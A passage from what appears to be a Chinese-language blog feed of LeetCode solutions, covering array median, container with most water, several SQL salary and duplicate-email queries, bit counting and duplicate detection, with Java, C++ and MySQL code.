<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nums1 &#x3D; [1, 3]</span><br><span class="line">nums2 &#x3D; [2]</span><br><span class="line"></span><br><span class="line">中位数是 2.0</span><br></pre></td></tr></table></figure>

<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nums1 &#x3D; [1, 2]</span><br><span class="line">nums2 &#x3D; [3, 4]</span><br><span class="line"></span><br><span class="line">中位数是 (2 + 3)&#x2F;2 &#x3D; 2.5</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>将两个数组排序成一个数组，然后求它们的中位数。因为数组是有序的，所以可以遍历一趟得到结果。算法复杂度为<strong>O(max(m,n))</strong>,与题目要求的不符。</p>
<h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">findMedianSortedArrays</span><span class="params">(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span>[] nums2)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> length1 = nums1.length;</span><br><span class="line">		<span class="keyword">int</span> length2 = nums2.length;</span><br><span class="line">        <span class="keyword">int</span>[] result = <span class="keyword">new</span> <span class="keyword">int</span>[length1 + length2];</span><br><span class="line">        <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> index1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> index2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (index1 &lt; length1 &amp;&amp; index2 &lt; length2) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (nums1[index1] &lt; nums2[index2]) &#123;</span><br><span class="line">        		result[index] = nums1[index1];</span><br><span class="line">        		index1++;</span><br><span class="line">        	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums1[index1] &gt; nums2[index2]) &#123;</span><br><span class="line">        		result[index] = nums2[index2];</span><br><span class="line">        		index2++;</span><br><span class="line">        	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        		result[index++] = nums1[index1];</span><br><span class="line">        		result[index] = nums1[index1];</span><br><span class="line">        		index1++;</span><br><span class="line">        		index2++;</span><br><span class="line">        	&#125;</span><br><span class="line">        	index++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (index1 &lt; length1) &#123;</span><br><span class="line">        	result[index++] = nums1[index1++];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> (index2 &lt; length2) &#123;</span><br><span class="line">        	result[index++] = nums2[index2++];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (result.length % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> (result[result.length / <span class="number">2</span>] + result[result.length / <span class="number">2</span> - <span class="number">1</span>]) / <span class="number">2.0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        	<span class="keyword">return</span> result[result.length / <span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">findKth</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> m, <span class="keyword">int</span> b[], <span class="keyword">int</span> n, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">	    <span class="keyword">if</span> (m &gt; n)</span><br><span class="line">	    	<span class="keyword">return</span> findKth(b, n, a, m, k);</span><br><span class="line">	    <span class="keyword">if</span> (m == <span class="number">0</span>)</span><br><span class="line">	    	<span class="keyword">return</span> b[k - <span class="number">1</span>];</span><br><span class="line">	    <span class="keyword">if</span> (k == <span class="number">1</span>)</span><br><span class="line">	    	<span class="keyword">return</span> min(a[<span class="number">0</span>], b[<span class="number">0</span>]);</span><br><span class="line">	    <span class="comment">//divide k into two parts</span></span><br><span class="line">	    <span class="keyword">int</span> pa = min(k / <span class="number">2</span>, m), pb = k - pa;</span><br><span class="line">	    <span class="keyword">if</span> (a[pa - <span class="number">1</span>] &lt; b[pb - <span class="number">1</span>])</span><br><span class="line">	    	<span class="keyword">return</span> findKth(a + pa, m - pa, b, n, k - pa);</span><br><span class="line">	    <span class="keyword">else</span> <span class="keyword">if</span> (a[pa - <span class="number">1</span>] &gt; b[pb - <span class="number">1</span>])</span><br><span class="line">	    	<span class="keyword">return</span> findKth(a, m, b + pb, n - pb, k - pb);</span><br><span class="line">    	<span class="keyword">else</span></span><br><span class="line">		    <span class="keyword">return</span> a[pa - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">findMedianSortedArrays</span><span class="params">(<span class="keyword">int</span> A[], <span class="keyword">int</span> m, <span class="keyword">int</span> B[], <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> total = m + n;</span><br><span class="line">		<span class="keyword">if</span> (total &amp; <span class="number">0x1</span>)</span><br><span class="line">			<span class="keyword">return</span> findKth(A, m, B, n, total / <span class="number">2</span> + <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span> (findKth(A, m, B, n, total / <span class="number">2</span>)</span><br><span class="line">					+ findKth(A, m, B, n, total / <span class="number">2</span> + <span class="number">1</span>)) / <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>11. 盛最多水的容器</title>
    <url>/2018/08/30/LeetCode/leetcode-000011-%E7%9B%9B%E6%9C%80%E5%A4%9A%E6%B0%B4%E7%9A%84%E5%AE%B9%E5%99%A8/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定 n 个非负整数 a1，a2，…，an，每个数代表坐标中的一个点 (i, ai) 。在坐标内画 n 条垂直线，垂直线 i 的两个端点分别为 (i, ai) 和 (i, 0)。找出其中的两条线，使得它们与 x 轴共同构成的容器可以容纳最多的水。</p>
<p><strong>说明：</strong>你不能倾斜容器，且 n 的值至少为 2。</p>
<p><img src="https://huhansi.github.io/images/2020-03-02-000011.jpg" alt="示例"></p>
<p><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [1,8,6,2,5,4,8,3,7]</span><br><span class="line">输出: 49</span><br></pre></td></tr></table></figure>

<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p><a href="https://leetcode-cn.com/problems/container-with-most-water/solution/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/container-with-most-water/solution/</a></p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxArea</span><span class="params">(<span class="keyword">int</span>[] height)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> right = height.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(left &lt; right) &#123;</span><br><span class="line">        max = Math.max(max,Math.min(height[left], height[right]) * (right - left));</span><br><span class="line">        <span class="keyword">if</span>(height[left] &lt; height[right]) &#123;</span><br><span class="line">            left++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            right--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxArea</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;height)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> right = height.size() - <span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(right &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> maxArea = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(left &lt; right) &#123;</span><br><span class="line">            <span class="keyword">int</span> area = (right - left) * (height[left] &gt;= height[right] ? height[right] : height[left]);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(area &gt; maxArea) &#123;</span><br><span class="line">                maxArea = area;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(height[left] &lt; height[right]) &#123;</span><br><span class="line">                left ++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                right --;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxArea;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>176. 第二高的薪水</title>
    <url>/2018/08/30/LeetCode/leetcode-000176.%20%E7%AC%AC%E4%BA%8C%E9%AB%98%E7%9A%84%E8%96%AA%E6%B0%B4/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>编写一个 SQL 查询，获取 <code>Employee</code> 表中第二高的薪水（Salary） 。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+--------+</span><br><span class="line">| Id | Salary |</span><br><span class="line">+----+--------+</span><br><span class="line">| 1  | 100    |</span><br><span class="line">| 2  | 200    |</span><br><span class="line">| 3  | 300    |</span><br><span class="line">+----+--------+</span><br></pre></td></tr></table></figure>
<p>例如上述 <code>Employee</code> 表，SQL查询应该返回 <code>200</code> 作为第二高的薪水。如果不存在第二高的薪水，那么查询应返回 <code>null</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------------------+</span><br><span class="line">| SecondHighestSalary |</span><br><span class="line">+---------------------+</span><br><span class="line">| 200                 |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>无</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Write your MySQL query statement below</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">Max</span>(Salary)  SecondHighestSalary</span><br><span class="line"><span class="keyword">from</span> Employee <span class="keyword">where</span> (<span class="keyword">select</span> <span class="keyword">Max</span>(Salary)<span class="keyword">from</span> Employee) &gt; Salary</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>177. 第N高的薪水</title>
    <url>/2018/08/30/LeetCode/leetcode-000177.%20%E7%AC%ACN%E9%AB%98%E7%9A%84%E8%96%AA%E6%B0%B4/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>编写一个 SQL 查询，获取 <code>Employee</code> 表中第 n 高的薪水（Salary）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+--------+</span><br><span class="line">| Id | Salary |</span><br><span class="line">+----+--------+</span><br><span class="line">| 1  | 100    |</span><br><span class="line">| 2  | 200    |</span><br><span class="line">| 3  | 300    |</span><br><span class="line">+----+--------+</span><br></pre></td></tr></table></figure>
<p>例如上述 <code>Employee</code> 表，n = 2 时，应返回第二高的薪水 <code>200</code>。如果不存在第 n 高的薪水，那么查询应返回 <code>null</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+------------------------+</span><br><span class="line">| getNthHighestSalary(2) |</span><br><span class="line">+------------------------+</span><br><span class="line">| 200                    |</span><br><span class="line">+------------------------+</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>无</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> getNthHighestSalary(N <span class="built_in">INT</span>) <span class="keyword">RETURNS</span> <span class="built_in">INT</span></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">declare</span> m <span class="built_in">int</span>;</span><br><span class="line"><span class="keyword">SET</span> m = N - <span class="number">1</span>;</span><br><span class="line">  RETURN (</span><br><span class="line">      <span class="keyword">select</span> <span class="keyword">distinct</span> Salary <span class="keyword">from</span> Employee <span class="keyword">order</span> <span class="keyword">by</span> Salary <span class="keyword">desc</span> <span class="keyword">limit</span> m, <span class="number">1</span></span><br><span class="line">  );</span><br><span class="line"><span class="keyword">END</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>184. 部门工资最高的员工</title>
    <url>/2018/08/30/LeetCode/leetcode-000184.%20%E9%83%A8%E9%97%A8%E5%B7%A5%E8%B5%84%E6%9C%80%E9%AB%98%E7%9A%84%E5%91%98%E5%B7%A5/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><code>Employee</code> 表包含所有员工信息，每个员工有其对应的 Id, salary 和 department Id。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+-------+--------+--------------+</span><br><span class="line">| Id | Name  | Salary | DepartmentId |</span><br><span class="line">+----+-------+--------+--------------+</span><br><span class="line">| 1  | Joe   | 70000  | 1            |</span><br><span class="line">| 2  | Henry | 80000  | 2            |</span><br><span class="line">| 3  | Sam   | 60000  | 2            |</span><br><span class="line">| 4  | Max   | 90000  | 1            |</span><br><span class="line">+----+-------+--------+--------------+</span><br></pre></td></tr></table></figure>
<p><code>Department</code> 表包含公司所有部门的信息。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+----------+</span><br><span class="line">| Id | Name     |</span><br><span class="line">+----+----------+</span><br><span class="line">| 1  | IT       |</span><br><span class="line">| 2  | Sales    |</span><br><span class="line">+----+----------+</span><br></pre></td></tr></table></figure>
<p>编写一个 SQL 查询，找出每个部门工资最高的员工。例如，根据上述给定的表格，Max 在 IT 部门有最高工资，Henry 在 Sales 部门有最高工资。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+------------+----------+--------+</span><br><span class="line">| Department | Employee | Salary |</span><br><span class="line">+------------+----------+--------+</span><br><span class="line">| IT         | Max      | 90000  |</span><br><span class="line">| Sales      | Henry    | 80000  |</span><br><span class="line">+------------+----------+--------+</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>无</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Write your MySQL query statement below</span></span><br><span class="line"><span class="keyword">select</span> Department.Name <span class="keyword">as</span> Department,Employee.Name <span class="keyword">as</span> Employee,Salary <span class="keyword">from</span> Employee,Department <span class="keyword">where</span> Employee.DepartmentId = Department.Id <span class="keyword">and</span> Salary = (<span class="keyword">select</span> <span class="keyword">max</span>(Salary) <span class="keyword">from</span> Employee <span class="keyword">where</span> Employee.DepartmentId = Department.Id) <span class="keyword">order</span> <span class="keyword">by</span> Department.Id <span class="keyword">desc</span>;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>196. 删除重复的电子邮箱</title>
    <url>/2018/08/30/LeetCode/leetcode-000196.%20%E5%88%A0%E9%99%A4%E9%87%8D%E5%A4%8D%E7%9A%84%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>编写一个 SQL 查询，来删除 <code>Person</code> 表中所有重复的电子邮箱，重复的邮箱里只保留 Id 最小 的那个。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+------------------+</span><br><span class="line">| Id | Email            |</span><br><span class="line">+----+------------------+</span><br><span class="line">| 1  | john@example.com |</span><br><span class="line">| 2  | bob@example.com  |</span><br><span class="line">| 3  | john@example.com |</span><br><span class="line">+----+------------------+</span><br><span class="line">Id 是这个表的主键。</span><br></pre></td></tr></table></figure>

<p>例如，在运行你的查询语句之后，上面的 <code>Person</code> 表应返回以下几行:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+------------------+</span><br><span class="line">| Id | Email            |</span><br><span class="line">+----+------------------+</span><br><span class="line">| 1  | john@example.com |</span><br><span class="line">| 2  | bob@example.com  |</span><br><span class="line">+----+------------------+</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>无</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Write your MySQL query statement below</span></span><br><span class="line"><span class="keyword">DELETE</span> p1 <span class="keyword">FROM</span> Person p1, Person p2 <span class="keyword">WHERE</span> p1.Email = p2.Email <span class="keyword">AND</span> p1.Id &gt; p2.Id</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>191. 位1的个数</title>
    <url>/2018/08/30/LeetCode/leetcode-000191.%20%E4%BD%8D1%E7%9A%84%E4%B8%AA%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>编写一个函数，输入是一个无符号整数，返回其二进制表达式中数字位数为 ‘1’ 的个数（也被称为汉明重量）</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 11</span><br><span class="line">输出: 3</span><br><span class="line">解释: 整数 11 的二进制表示为 00000000000000000000000000001011</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 128</span><br><span class="line">输出: 1</span><br><span class="line">解释: 整数 128 的二进制表示为 00000000000000000000000010000000</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：使用库函数"><a href="#解法一：使用库函数" class="headerlink" title="解法一：使用库函数"></a>解法一：使用库函数</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="comment">// you need to treat n as an unsigned value</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hammingWeight</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Integer.bitCount(n);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="解法二：使用布赖恩·克尼根位计数算法"><a href="#解法二：使用布赖恩·克尼根位计数算法" class="headerlink" title="解法二：使用布赖恩·克尼根位计数算法"></a>解法二：使用<a href="https://www.techiedelight.com/brian-kernighans-algorithm-count-set-bits-integer/" target="_blank" rel="noopener">布赖恩·克尼根位计数算法</a></h4><h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hammingWeight</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">0</span> != n) &#123;</span><br><span class="line">        	n = n &amp; (n - <span class="number">1</span>);</span><br><span class="line">        	count++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三：移位-超时"><a href="#解法三：移位-超时" class="headerlink" title="解法三：移位(超时)"></a>解法三：移位(超时)</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hammingWeight</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">	    <span class="keyword">int</span> distance = <span class="number">0</span>;</span><br><span class="line">	    <span class="keyword">while</span> (n != <span class="number">0</span>) &#123;</span><br><span class="line">	      <span class="keyword">if</span> (n % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">	        distance += <span class="number">1</span>;</span><br><span class="line">	      n = n &gt;&gt; <span class="number">1</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">return</span> distance;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>217. 存在重复元素</title>
    <url>/2018/08/30/LeetCode/leetcode-000217.%20%E5%AD%98%E5%9C%A8%E9%87%8D%E5%A4%8D%E5%85%83%E7%B4%A0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个整数数组，判断是否存在重复元素。</p>
<p>如果任何值在数组中出现至少两次，函数返回 true。如果数组中每个元素都不相同，则返回 false。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [1,2,3,1]</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [1,2,3,4]</span><br><span class="line">输出: false</span><br></pre></td></tr></table></figure>
<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [1,1,1,3,3,4,3,2,4,2]</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>排序完之后，比较相邻两个元素是否一样即可。是的话，则返回true，否则返回false。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">containsDuplicate</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (;i &lt; nums.length - <span class="number">1</span>;i++) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (nums[i] == nums[i + <span class="number">1</span>]) &#123;</span><br><span class="line">        		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：借助HashSet"><a href="#解法二：借助HashSet" class="headerlink" title="解法二：借助HashSet"></a>解法二：借助HashSet</h3><p>遍历数组，对于每个num，如果在set中已经存在了，表示已经出现过，则数组存在重复，否则加入set。</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">containsDuplicate</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		Set&lt;Integer&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">			<span class="keyword">if</span> (set.contains(num)) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			set.add(num);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三：暴力破解"><a href="#解法三：暴力破解" class="headerlink" title="解法三：暴力破解"></a>解法三：暴力破解</h3><p>此方法会超时</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">containsDuplicate</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>;j &lt; nums.length;j++) &#123;</span><br><span class="line">				<span class="keyword">if</span> (nums[i] == nums[j]) &#123;</span><br><span class="line">					<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>231. 2的幂</title>
    <url>/2018/08/30/LeetCode/leetcode-000231.%202%E7%9A%84%E5%B9%82/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 1</span><br><span class="line">输出: true</span><br><span class="line">解释: 20 &#x3D; 1</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 16</span><br><span class="line">输出: true</span><br><span class="line">解释: 24 &#x3D; 16</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 218</span><br><span class="line">输出: false</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>2的幂次数值转换为二进制之后，只有一个1，统计每个数字二进制的1的个数就行。</p>
